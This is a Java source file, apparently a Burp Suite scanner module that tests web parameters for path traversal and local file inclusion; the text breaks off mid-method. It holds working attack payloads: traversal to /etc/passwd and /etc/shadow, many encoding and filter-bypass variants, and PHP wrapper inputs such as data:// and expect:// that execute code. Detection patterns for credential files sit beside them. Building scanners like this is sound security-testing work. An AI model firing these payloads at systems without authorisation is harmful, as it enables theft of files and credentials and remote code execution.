package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.CollaboratorManager;
import com.omnistrike.framework.DeduplicationStore;
import com.omnistrike.framework.FindingsStore;
import com.omnistrike.framework.PayloadEncoder;

import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Path Traversal / LFI Scanner
 * Tests all parameter types for local file inclusion and path traversal
 * with increasing depth, multiple encoding bypasses, and PHP wrapper detection.
 */
public class PathTraversalScanner implements ScanModule {

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;
    private CollaboratorManager collaboratorManager;

    // Smart parameter selection: prioritize file-related parameter names
    private static final Pattern FILE_PARAM_PATTERN = Pattern.compile(
            "(?i)(file|path|page|include|template|doc|folder|dir|upload|download|filename|filepath|" +
                    "resource|url|src|load|read|fetch|content|document|report|config|log|img|image|" +
                    "attachment|name|location|view|layout|module|theme|lang|language)"
    );

    // Confirmed file read patterns
    // Require complete colon-delimited line: root:x:0:0: or root:*:0:0:
    private static final Pattern UNIX_PASSWD_PATTERN = Pattern.compile("root:[x*]:0:0:[^:]*:[^:]*:[^\\n]*");
    private static final Pattern UNIX_HOSTNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9][a-zA-Z0-9._-]+$", Pattern.MULTILINE);
    private static final Pattern UNIX_ENVIRON_PATTERN = Pattern.compile("(PATH=|HOME=|USER=|SHELL=)");
    private static final Pattern WIN_INI_PATTERN = Pattern.compile("\\[(fonts|extensions|mci extensions|files)\\]", Pattern.CASE_INSENSITIVE);
    private static final Pattern WIN_HOSTS_PATTERN = Pattern.compile("127\\.0\\.0\\.1\\s+localhost", Pattern.CASE_INSENSITIVE);
    private static final Pattern PHP_INFO_PATTERN = Pattern.compile("(phpinfo\\(\\)|PHP Version|PHP Extension|Zend Engine)", Pattern.CASE_INSENSITIVE);
    // Require root: followed by a hash algorithm identifier ($1$, $5$, $6$, $y$) or locked markers
    private static final Pattern UNIX_SHADOW_PATTERN = Pattern.compile("root:\\$[156y]\\$|root:!:|root:\\*:");
    private static final Pattern UNIX_ISSUE_PATTERN = Pattern.compile("(Ubuntu|Debian|CentOS|Red Hat|Fedora|Alpine|Arch|SUSE|Gentoo|Linux)", Pattern.CASE_INSENSITIVE);
    private static final Pattern BASE64_PATTERN = Pattern.compile("^[A-Za-z0-9+/]{50,}={0,2}$", Pattern.MULTILINE);

    @Override
    public String getId() { return "path-traversal"; }

    @Override
    public String getName() { return "Path Traversal / LFI Scanner"; }

    @Override
    public String getDescription() {
        return "Path traversal and LFI detection: Unix/Windows file reads, encoding bypasses (double encoding, null byte, UTF-8 overlong), and PHP wrappers.";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<TraversalTarget> targets = extractTargets(request);
        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
        return runTraversalTargets(requestResponse, targets, urlPath);
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<TraversalTarget> targets = extractTargets(request);
        return runTraversalTargets(requestResponse, targets, urlPath);
    }

    private List<Finding> runTraversalTargets(HttpRequestResponse requestResponse,
                                               List<TraversalTarget> targets, String urlPath) {
        for (TraversalTarget target : targets) {
            if (!dedup.markIfNew("path-traversal", urlPath, target.name)) continue;

            try {
                testTraversal(requestResponse, target);
            } catch (Exception e) {
                api.logging().logToError("Path traversal test error on " + target.name + ": " + e.getMessage());
            }
        }

        return Collections.emptyList();
    }

    private void testTraversal(HttpRequestResponse original, TraversalTarget target) throws InterruptedException {
        String url = original.request().url();
        int maxDepth = config.getInt("traversal.maxDepth", 10);

        // Phase 1: Baseline
        HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
        if (baseline == null || baseline.response() == null) return;
        String baselineBody = baseline.response().bodyToString();
        int baselineLen = baselineBody != null ? baselineBody.length() : 0;
        int baselineStatus = baseline.response().statusCode();

        // Phase 1.5: Absolute path testing (no traversal sequences)
        // Catches apps that use the parameter as a direct file path without any path joining
        if (config.getBool("traversal.absolutePath.enabled", true)) {
            if (testAbsolutePaths(original, target, url, baselineBody, baselineLen)) return;
        }

        // Phase 2: Unix traversal
        if (config.getBool("traversal.unix.enabled", true)) {
            if (testUnixTraversal(original, target, url, maxDepth, baselineBody, baselineLen)) return;
        }

        // Phase 3: Windows traversal
        if (config.getBool("traversal.windows.enabled", true)) {
            if (testWindowsTraversal(original, target, url, maxDepth, baselineBody, baselineLen)) return;
        }

        // Phase 4: Encoding bypass
        if (config.getBool("traversal.encodingBypass.enabled", true)) {
            if (testEncodingBypass(original, target, url, maxDepth, baselineBody, baselineLen)) return;
        }

        // Phase 5: PHP wrappers (only if PHP detected)
        if (config.getBool("traversal.phpWrappers.enabled", true) && isPhpTarget(original)) {
            testPhpWrappers(original, target, url, baselineBody, baselineLen);
        }
    }

    // ==================== PHASE 1.5: ABSOLUTE PATH TESTING ====================

    private boolean testAbsolutePaths(HttpRequestResponse original, TraversalTarget target,
                                       String url, String baselineBody, int baselineLen)
            throws InterruptedException {
        // Test direct absolute paths — catches apps that use the parameter as a file path
        // without any directory joining. Tested before traversal since they need fewer requests.
        String[][] absolutePaths = {
                {"/etc/passwd", "UNIX_PASSWD"},
                {"/etc/shadow", "UNIX_SHADOW"},
                {"C:\\windows\\win.ini", "WIN_INI"},
                {"C:/windows/win.ini", "WIN_INI"},
        };

        for (String[] pathDef : absolutePaths) {
            String absPath = pathDef[0];
            String checkType = pathDef[1];

            HttpRequestResponse result = sendPayload(original, target, absPath);
            if (result == null || result.response() == null) continue;
            if (result.response().statusCode() >= 400) continue;

            String body = result.response().bodyToString();
            if (body == null) continue;

            ConfirmedRead confirmed = detectConfirmedRead(body, checkType, baselineBody);
            if (confirmed != null) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "Direct File Read via Absolute Path: " + absPath,
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + absPath + " (absolute path, no traversal) | Match: " + confirmed.evidence)
                        .description("Local file read confirmed via direct absolute path injection. "
                                + "Parameter '" + target.name + "' accepts absolute file paths without traversal sequences.")
                        .remediation("Never use user input directly in file paths. Use a whitelist of allowed "
                                + "files or IDs that map to server-side paths.")
                        .requestResponse(result)
                        .payload(absPath)
                        .responseEvidence(confirmed.evidence)
                        .build());
                return true;
            }
            perHostDelay();
        }
        return false;
    }

    // ==================== PHASE 2: UNIX TRAVERSAL ====================

    private boolean testUnixTraversal(HttpRequestResponse original, TraversalTarget target,
                                       String url, int maxDepth, String baselineBody,
                                       int baselineLen) throws InterruptedException {
        String[][] unixFiles = {
                {"etc/passwd", "UNIX_PASSWD"},
                {"proc/self/environ", "UNIX_ENVIRON"},
                {"proc/self/cmdline", "UNIX_CMDLINE"},
                {"etc/shadow", "UNIX_SHADOW"},
                {"etc/group", "UNIX_GROUP"},
                {"etc/resolv.conf", "UNIX_RESOLV"},
                {"proc/version", "UNIX_PROCVERSION"},
                {"proc/self/status", "UNIX_PROCSTATUS"},
                {"etc/os-release", "UNIX_OSRELEASE"},
                {"etc/crontab", "UNIX_CRONTAB"},
                {"etc/hosts", "UNIX_HOSTS"},
                {"proc/net/tcp", "UNIX_PROCTCP"},
                {"etc/nginx/nginx.conf", "UNIX_NGINX"},
                {"etc/apache2/apache2.conf", "UNIX_APACHE"},
                {"etc/ssh/sshd_config", "UNIX_SSHD"},
                {"etc/mysql/my.cnf", "UNIX_MYSQL"},
                {"etc/my.cnf", "UNIX_MYSQL"},
                {"etc/redis/redis.conf", "UNIX_REDIS"},
                {"etc/redis.conf", "UNIX_REDIS"},
                {"etc/ssl/openssl.cnf", "UNIX_OPENSSL"},
                {"var/log/apache2/access.log", "UNIX_ACCESSLOG"},
                {"var/log/httpd/access_log", "UNIX_ACCESSLOG"},
                {"etc/postgresql/15/main/pg_hba.conf", "UNIX_PGHBA"},
                {"etc/postgresql/16/main/pg_hba.conf", "UNIX_PGHBA"},
        };

        for (String[] fileDef : unixFiles) {
            String targetFile = fileDef[0];
            String checkType = fileDef[1];

            for (int depth = 1; depth <= maxDepth; depth++) {
                String traversal = "../".repeat(depth) + targetFile;
                HttpRequestResponse result = sendPayload(original, target, traversal);
                if (result == null || result.response() == null) continue;

                // Skip error responses — file read should produce a 200, not a 4xx/5xx error page
                if (result.response().statusCode() >= 400) continue;

                String body = result.response().bodyToString();
                if (body == null) continue;

                ConfirmedRead confirmed = detectConfirmedRead(body, checkType, baselineBody);
                if (confirmed != null) {
                    findingsStore.addFinding(Finding.builder("path-traversal",
                                    "Path Traversal: " + targetFile + " Read Confirmed",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Payload: " + traversal + " | Match: " + confirmed.evidence)
                            .description("Local file read confirmed via path traversal. The file /" + targetFile
                                    + " was successfully read through parameter '" + target.name + "'.")
                            .remediation("Never use user input directly in file paths. Use a whitelist of allowed "
                                    + "files or IDs that map to server-side paths. Apply chroot/jail if applicable.")
                            .requestResponse(result)
                            .payload(traversal)
                            .responseEvidence(confirmed.evidence)
                            .build());
                    return true;
                }
                perHostDelay();
            }
        }
        return false;
    }

    // ==================== PHASE 3: WINDOWS TRAVERSAL ====================

    private boolean testWindowsTraversal(HttpRequestResponse original, TraversalTarget target,
                                          String url, int maxDepth, String baselineBody,
                                          int baselineLen) throws InterruptedException {
        String[][] winFiles = {
                {"windows\\win.ini", "WIN_INI"},
                {"windows\\system32\\drivers\\etc\\hosts", "WIN_HOSTS"},
                {"boot.ini", "WIN_BOOTINI"},
                {"windows\\system.ini", "WIN_SYSTEMINI"},
                {"windows\\php.ini", "WIN_PHPINI"},
                {"inetpub\\wwwroot\\web.config", "WIN_WEBCONFIG"},
                {"windows\\debug\\NetSetup.log", "WIN_NETSETUP"},
                {"windows\\system32\\license.rtf", "WIN_LICENSE"},
                {"programdata\\mysql\\my.ini", "WIN_MYSQL"},
        };

        for (String[] fileDef : winFiles) {
            String targetFile = fileDef[0];
            String checkType = fileDef[1];

            for (int depth = 1; depth <= maxDepth; depth++) {
                String traversal = "..\\".repeat(depth) + targetFile;
                HttpRequestResponse result = sendPayload(original, target, traversal);
                if (result == null || result.response() == null) continue;

                // Skip error responses — file read should produce a 200, not a 4xx/5xx error page
                if (result.response().statusCode() >= 400) continue;

                String body = result.response().bodyToString();
                if (body == null) continue;

                ConfirmedRead confirmed = detectConfirmedRead(body, checkType, baselineBody);
                if (confirmed != null) {
                    findingsStore.addFinding(Finding.builder("path-traversal",
                                    "Path Traversal: " + targetFile + " Read Confirmed (Windows)",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Payload: " + traversal + " | Match: " + confirmed.evidence)
                            .description("Local file read confirmed via path traversal on a Windows target. "
                                    + "The file " + targetFile + " was successfully read.")
                            .remediation("Never use user input directly in file paths. Use a whitelist approach.")
                            .requestResponse(result)
                            .payload(traversal)
                            .responseEvidence(confirmed.evidence)
                            .build());
                    return true;
                }
                perHostDelay();
            }
        }
        return false;
    }

    // ==================== PHASE 4: ENCODING BYPASS ====================

    private boolean testEncodingBypass(HttpRequestResponse original, TraversalTarget target,
                                        String url, int maxDepth, String baselineBody,
                                        int baselineLen) throws InterruptedException {
        int depth = Math.min(maxDepth, 6); // Use moderate depth for bypass attempts

        // Double URL encoding: %252e%252e%252f
        String doubleEncoded = "%252e%252e%252f".repeat(depth) + "etc/passwd";

        // Null byte injection (bypass extension checks)
        String nullByte = "../".repeat(depth) + "etc/passwd%00.png";

        // UTF-8 overlong encoding
        String utf8Overlong = "..%c0%af".repeat(depth) + "etc/passwd";

        // Path normalization bypasses
        String dotDotSlashSlash = "....//".repeat(depth) + "etc/passwd";
        String semicolonBypass = "..;/".repeat(depth) + "etc/passwd";

        // Also try Windows variants
        String doubleEncodedWin = "%252e%252e%255c".repeat(depth) + "windows\\win.ini";

        // Null byte with extension (bypass extension whitelist)
        String nullByteExt = "../".repeat(depth) + "etc/passwd%00.jpg";

        // Backslash normalization (IIS/Windows path normalization)
        String backslashNorm = "..\\".repeat(depth) + "etc/passwd";

        // URL-encoded dots (%2e%2e/)
        String urlEncodedDots = "%2e%2e/".repeat(depth) + "etc/passwd";

        // Full URL encoding of traversal sequence
        String fullUrlEncoded = "%2e%2e%2f".repeat(depth) + "etc/passwd";

        String[][] bypasses = {
                {doubleEncoded, "UNIX_PASSWD", "Double URL encoding"},
                {nullByte, "UNIX_PASSWD", "Null byte injection"},
                {utf8Overlong, "UNIX_PASSWD", "UTF-8 overlong encoding"},
                {dotDotSlashSlash, "UNIX_PASSWD", "Path normalization (....//)"} ,
                {semicolonBypass, "UNIX_PASSWD", "Semicolon bypass (..;/)"},
                {doubleEncodedWin, "WIN_INI", "Double URL encoding (Windows)"},
                {nullByteExt, "UNIX_PASSWD", "Null byte with extension bypass"},
                {backslashNorm, "UNIX_PASSWD", "Backslash normalization"},
                {urlEncodedDots, "UNIX_PASSWD", "URL-encoded dots (%2e%2e/)"},
                {fullUrlEncoded, "UNIX_PASSWD", "Full URL encoding (%2e%2e%2f)"},
                // Triple URL encoding
                {"%25252e%25252e%25252f".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Triple URL encoding"},
                // Mixed forward/backslash
                {"..\\./".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Mixed slash/backslash"},
                // Unicode normalization (U+2025 Two Dot Leader)
                {"\u2025/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Unicode two-dot leader"},
                // IIS 8.3 short filename notation
                {"..\\".repeat(depth) + "WINDOW~1\\win.ini", "WIN_INI", "IIS 8.3 short filename"},
                // Double-dot with extra slashes
                {"..///".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Double-dot triple slash"},
                // Dot segments in middle
                {"/." + "/..".repeat(depth) + "/etc/passwd", "UNIX_PASSWD", "Leading dot + traversal"},
                // URL-encoded backslash
                {"%5c..%5c".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "URL-encoded backslash (\\..\\)"},
                // Tab/space variants
                {"..%09/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Tab byte in traversal"},
                // Reverse traversal (for some WAFs)
                {"/..\\.\\".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Reverse mixed traversal"},
                // UTF-8 full-width dot
                {"\uff0e\uff0e/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "UTF-8 fullwidth dots"},
                // IIS 16-bit Unicode encoding
                {"%u002e%u002e%u002f".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "IIS 16-bit Unicode (%u002e)"},
                // UTF-8 fullwidth solidus (U+FF0F for /)
                {"..%ef%bc%8f".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "UTF-8 fullwidth solidus"},
                // Tomcat/Jetty session bypass (semicolon treated as path parameter delimiter)
                {"..;jsessionid=x/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Tomcat jsessionid bypass (..;jsessionid=x/)"},
                // Null byte between traversal segments
                {"..%00/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Null byte in traversal segment"},
                // Carriage return in traversal
                {"..%0d/".repeat(depth) + "etc/passwd", "UNIX_PASSWD", "Carriage return in traversal"},
        };

        for (String[] bypass : bypasses) {
            String payload = bypass[0];
            String checkType = bypass[1];
            String technique = bypass[2];

            HttpRequestResponse result = sendPayload(original, target, payload);
            if (result == null || result.response() == null) continue;

            // Skip error responses
            if (result.response().statusCode() >= 400) continue;

            String body = result.response().bodyToString();
            if (body == null) continue;

            ConfirmedRead confirmed = detectConfirmedRead(body, checkType, baselineBody);
            if (confirmed != null) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "Path Traversal via " + technique,
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + payload + " | Technique: " + technique
                                + " | Match: " + confirmed.evidence)
                        .description("Path traversal confirmed using encoding bypass technique: " + technique
                                + ". The server's path traversal filter was bypassed.")
                        .remediation("Canonicalize/normalize file paths before validating them. Use realpath() "
                                + "or equivalent to resolve the actual path, then check it against the allowed directory.")
                        .requestResponse(result)
                        .payload(payload)
                        .responseEvidence(confirmed.evidence)
                        .build());
                return true;
            }
            perHostDelay();
        }
        return false;
    }

    // ==================== PHASE 5: PHP WRAPPERS ====================

    private void testPhpWrappers(HttpRequestResponse original, TraversalTarget target,
                                  String url, String baselineBody, int baselineLen) throws InterruptedException {
        // php://filter base64 encoding — reads source code
        // Structural validation: response must contain valid base64 that decodes to readable PHP/HTML
        String filterPayload = "php://filter/convert.base64-encode/resource=index";
        HttpRequestResponse filterResult = sendPayload(original, target, filterPayload);
        if (filterResult != null && filterResult.response() != null
                && filterResult.response().statusCode() == 200) {
            String body = filterResult.response().bodyToString();
            if (body != null && BASE64_PATTERN.matcher(body).find()
                    && (baselineBody == null || !BASE64_PATTERN.matcher(baselineBody).find())) {
                // Validate: try to decode the base64 and check for PHP/HTML markers
                if (isValidBase64WithReadableContent(body)) {
                    findingsStore.addFinding(Finding.builder("path-traversal",
                                    "LFI via php://filter — Source Code Disclosure",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Payload: " + filterPayload + " | Response contains base64-encoded PHP/HTML source")
                            .description("PHP filter wrapper successfully used to read source code. "
                                    + "The response contains base64-encoded PHP source that decodes to readable code.")
                            .remediation("Disable PHP stream wrappers (allow_url_include=Off). Never pass user "
                                    + "input to include/require functions. Use a whitelist of includable files.")
                            .requestResponse(filterResult)
                            .payload(filterPayload)
                            .build());
                }
            }
        }
        perHostDelay();

        // data:// wrapper (code execution)
        // Structural validation: response must contain phpinfo() structural output (multiple markers)
        String dataPayload = "data://text/plain,<?php phpinfo();?>";
        HttpRequestResponse dataResult = sendPayload(original, target, dataPayload);
        if (dataResult != null && dataResult.response() != null) {
            String body = dataResult.response().bodyToString();
            if (body != null && isConfirmedPhpInfo(body)
                    && (baselineBody == null || !isConfirmedPhpInfo(baselineBody))) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI to RCE via data:// Wrapper",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + dataPayload + " | phpinfo() structural output confirmed")
                        .description("PHP data:// wrapper successfully executed arbitrary PHP code. "
                                + "This is a full Remote Code Execution vulnerability via Local File Inclusion.")
                        .remediation("Set allow_url_include=Off in php.ini. Never pass user input to "
                                + "include/require functions.")
                        .requestResponse(dataResult)
                        .payload(dataPayload)
                        .responseEvidence("PHP Version")
                        .build());
            }
        }
        perHostDelay();

        // php://filter chain variant (read specific file)
        // Structural validation: decoded base64 must contain /etc/passwd structural content
        String filterChainPayload = "php://filter/read=convert.base64-encode/resource=/etc/passwd";
        HttpRequestResponse filterChainResult = sendPayload(original, target, filterChainPayload);
        if (filterChainResult != null && filterChainResult.response() != null) {
            String body = filterChainResult.response().bodyToString();
            if (body != null && BASE64_PATTERN.matcher(body).find()
                    && (baselineBody == null || !BASE64_PATTERN.matcher(baselineBody).find())) {
                // Decode base64 and check for passwd structure
                if (isBase64DecodingToPasswd(body)) {
                    findingsStore.addFinding(Finding.builder("path-traversal",
                                    "LFI via php://filter chain — /etc/passwd",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Payload: " + filterChainPayload + " | Base64 decodes to /etc/passwd content")
                            .description("PHP filter wrapper read /etc/passwd. Decoded content contains passwd structure.")
                            .remediation("Disable PHP stream wrappers (allow_url_include=Off). Use a whitelist.")
                            .requestResponse(filterChainResult)
                            .payload(filterChainPayload)
                            .build());
                }
            }
        }
        perHostDelay();

        // php://input wrapper — REMOVED: response body difference alone is not a finding.
        // Without being able to inject a specific PHP payload into the POST body and confirm
        // its output appears, we cannot structurally validate code execution.
        perHostDelay();

        // phar:// wrapper — REMOVED: response difference alone is not a finding.
        // Without Collaborator confirmation or injected output matching, cannot confirm.
        perHostDelay();

        // expect:// wrapper (command execution)
        // Structural validation: response must contain uid=N(username) gid=N(groupname) format
        String expectPayload = "expect://id";
        HttpRequestResponse expectResult = sendPayload(original, target, expectPayload);
        if (expectResult != null && expectResult.response() != null) {
            String body = expectResult.response().bodyToString();
            Pattern idOutputPattern = Pattern.compile("uid=\\d+\\([^)]+\\)\\s+gid=\\d+\\([^)]+\\)");
            Matcher idMatcher = body != null ? idOutputPattern.matcher(body) : null;
            if (idMatcher != null && idMatcher.find()
                    && (baselineBody == null || !idOutputPattern.matcher(baselineBody).find())) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI to RCE via expect:// Wrapper",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + expectPayload + " | Command output: " + idMatcher.group())
                        .description("PHP expect:// wrapper executed an OS command. The `id` command output "
                                + "was returned. This is a full Remote Code Execution vulnerability.")
                        .remediation("Disable the expect extension. Set allow_url_include=Off.")
                        .requestResponse(expectResult)
                        .payload(expectPayload)
                        .responseEvidence(idMatcher.group())
                        .build());
            }
        }
        perHostDelay();

        // zip:// wrapper — REMOVED: response difference alone is not a finding.
        // Without Collaborator confirmation or injected output matching, cannot confirm.
        perHostDelay();

        // php://filter with ROT13
        // Structural validation: decoded ROT13 must contain PHP markers (<?php, <html, etc.)
        String rot13Payload = "php://filter/read=string.rot13/resource=index";
        HttpRequestResponse rot13Result = sendPayload(original, target, rot13Payload);
        if (rot13Result != null && rot13Result.response() != null
                && rot13Result.response().statusCode() == 200) {
            String body = rot13Result.response().bodyToString();
            if (body != null && (baselineBody == null || !body.equals(baselineBody))) {
                // ROT13 of "<?php" is "<?cuc", "<html" is "<ugzy"
                if (body.contains("<?cuc") || body.contains("<ugzy") || body.contains("shapgvba")) {
                    findingsStore.addFinding(Finding.builder("path-traversal",
                                    "LFI via php://filter (ROT13) — Source Code Disclosure",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Payload: " + rot13Payload + " | ROT13-encoded PHP/HTML markers found (<?cuc, <ugzy)")
                            .description("PHP filter wrapper with ROT13 encoding returned source code. "
                                    + "ROT13-encoded PHP markers confirm file content was read.")
                            .remediation("Disable PHP stream wrappers. Use a whitelist of includable files.")
                            .requestResponse(rot13Result)
                            .payload(rot13Payload)
                            .responseEvidence("<?cuc")
                            .build());
                }
            }
        }
        perHostDelay();

        // php://filter with iconv UTF-8 to UTF-7 encoding
        // Structural validation: UTF-7 markers (+ADw- for <, +AD4- for >) confirm filter chain worked
        String iconvPayload = "php://filter/convert.iconv.UTF-8.UTF-7/resource=index";
        HttpRequestResponse iconvResult = sendPayload(original, target, iconvPayload);
        if (iconvResult != null && iconvResult.response() != null
                && iconvResult.response().statusCode() == 200) {
            String iconvBody = iconvResult.response().bodyToString();
            if (iconvBody != null && (baselineBody == null || !iconvBody.equals(baselineBody))) {
                // UTF-7 encoding of < is +ADw-, > is +AD4-, " is +ACI-, [ is +AFs-
                int utf7Count = 0;
                if (iconvBody.contains("+ADw-")) utf7Count++;
                if (iconvBody.contains("+AD4-")) utf7Count++;
                if (iconvBody.contains("+ACI-")) utf7Count++;
                if (iconvBody.contains("+AFs-")) utf7Count++;
                if (utf7Count >= 2
                        && (baselineBody == null || !baselineBody.contains("+ADw-"))) {
                    findingsStore.addFinding(Finding.builder("path-traversal",
                                    "LFI via php://filter (iconv UTF-7) — Source Code Disclosure",
                                    Severity.CRITICAL, Confidence.CERTAIN)
                            .url(url).parameter(target.name)
                            .evidence("Payload: " + iconvPayload + " | UTF-7 markers found (" + utf7Count + "/4)")
                            .description("PHP filter wrapper with iconv UTF-8 to UTF-7 conversion returned source code. "
                                    + "UTF-7 encoded markers confirm file content was read through the filter chain.")
                            .remediation("Disable PHP stream wrappers. Use a whitelist of includable files.")
                            .requestResponse(iconvResult)
                            .payload(iconvPayload)
                            .responseEvidence("+ADw-")
                            .build());
                }
            }
        }
        perHostDelay();

        // php://filter with zlib — REMOVED: compressed output cannot be structurally validated
        // in a text HTTP response without decompression. Response difference alone is not a finding.
        perHostDelay();

        // data:// with base64 encoded PHP
        // Structural validation: same as plain data:// — require confirmed phpinfo output
        String dataB64Payload = "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==";
        HttpRequestResponse dataB64Result = sendPayload(original, target, dataB64Payload);
        if (dataB64Result != null && dataB64Result.response() != null) {
            String body = dataB64Result.response().bodyToString();
            if (body != null && isConfirmedPhpInfo(body)
                    && (baselineBody == null || !isConfirmedPhpInfo(baselineBody))) {
                findingsStore.addFinding(Finding.builder("path-traversal",
                                "LFI to RCE via data:// (Base64) Wrapper",
                                Severity.CRITICAL, Confidence.CERTAIN)
                        .url(url).parameter(target.name)
                        .evidence("Payload: " + dataB64Payload + " | phpinfo() structural output confirmed")
                        .description("PHP data:// wrapper with base64 encoding executed PHP code. "
                                + "phpinfo() structural output confirms code execution.")
                        .remediation("Set allow_url_include=Off in php.ini.")
                        .requestResponse(dataB64Result)
                        .payload(dataB64Payload)
                        .responseEvidence("PHP Version")
                        .build());
            }
        }
        perHostDelay();
    }

    /**
     * Validates that response contains base64 that decodes to readable PHP/HTML content.
     */
    private boolean isValidBase64WithReadableContent(String body) {
        try {
            // Extract the longest base64 block from the body
            Matcher m = BASE64_PATTERN.matcher(body);
            while (m.find()) {
                String b64 = m.group().trim();
                if (b64.length() < 50) continue;
                byte[] decoded = java.util.Base64.getDecoder().decode(b64);
                String content = new String(decoded, StandardCharsets.UTF_8);
                // Check for PHP/HTML structural markers in decoded content
                if (content.contains("<?php") || content.contains("<?=")
                        || content.contains("<html") || content.contains("<!DOCTYPE")
                        || content.contains("function ") || content.contains("class ")) {
                    return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    /**
     * Validates that response contains confirmed phpinfo() output (multiple structural markers).
     */
    private boolean isConfirmedPhpInfo(String body) {
        // Require at least 2 of these phpinfo() structural markers
        int markers = 0;
        if (body.contains("PHP Version")) markers++;
        if (body.contains("PHP Extension")) markers++;
        if (body.contains("Zend Engine")) markers++;
        if (body.contains("php.ini")) markers++;
        if (body.contains("Configuration File")) markers++;
        if (body.contains("PHP API")) markers++;
        return markers >= 2;
    }

    /**
     * Checks if base64 in response decodes to /etc/passwd content (root:x:0:0:).
     */
    private boolean isBase64DecodingToPasswd(String body) {
        try {
            Matcher m = BASE64_PATTERN.matcher(body);
            while (m.find()) {
                String b64 = m.group().trim();
                if (b64.length() < 20) continue;
                byte[] decoded = java.util.Base64.getDecoder().decode(b64);
                String content = new String(decoded, StandardCharsets.UTF_8);
                if (UNIX_PASSWD_PATTERN.matcher(content).find()) {
                    return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    // ==================== TARGET EXTRACTION ====================

    private List<TraversalTarget> extractTargets(HttpRequest request) {
        List<TraversalTarget> targets = new ArrayList<>();

        // Query parameters
        for (var param : request.parameters()) {
            if (!FILE_PARAM_PATTERN.matcher(param.name()).find()) continue;
            switch (param.type()) {
                case URL:
                    targets.add(new TraversalTarget(param.name(), param.value(), TargetType.QUERY));
                    break;
                case BODY:
                    targets.add(new TraversalTarget(param.name(), param.value(), TargetType.BODY));
                    break;
                case COOKIE:
                    targets.add(new TraversalTarget(param.name(), param.value(), TargetType.COOKIE));
                    break;
            }
        }

        // Also check params with file-like values (containing / or \ or extensions)
        for (var param : request.parameters()) {
            if (param.value() != null && (param.value().contains("/") || param.value().contains("\\")
                    || param.value().matches(".*\\.[a-zA-Z]{2,5}$"))) {
                TargetType type;
                switch (param.type()) {
                    case URL: type = TargetType.QUERY; break;
                    case COOKIE: type = TargetType.COOKIE; break;
                    default: type = TargetType.BODY; break;
                }
                TraversalTarget t = new TraversalTarget(param.name(), param.value(), type);
                if (!targets.contains(t)) targets.add(t);
            }
        }

        // JSON body values
        String ct = "";
        for (var h : request.headers()) {
            if (h.name().equalsIgnoreCase("Content-Type")) { ct = h.value(); break; }
        }
        if (ct.contains("application/json")) {
            try {
                String body = request.bodyToString();
                if (body != null) {
                    com.google.gson.JsonElement el = com.google.gson.JsonParser.parseString(body);
                    if (el.isJsonObject()) {
                        extractJsonTargets(el.getAsJsonObject(), "", targets);
                    }
                }
            } catch (Exception ignored) {}
        }

        return targets;
    }

    private void extractJsonTargets(com.google.gson.JsonObject obj, String prefix, List<TraversalTarget> targets) {
        for (String key : obj.keySet()) {
            com.google.gson.JsonElement val = obj.get(key);
            String fullKey = prefix.isEmpty() ? key : prefix + "." + key;
            if (val.isJsonPrimitive() && val.getAsJsonPrimitive().isString()) {
                String v = val.getAsString();
                if (FILE_PARAM_PATTERN.matcher(key).find()
                        || v.contains("/") || v.contains("\\")
                        || v.matches(".*\\.[a-zA-Z]{2,5}$")) {
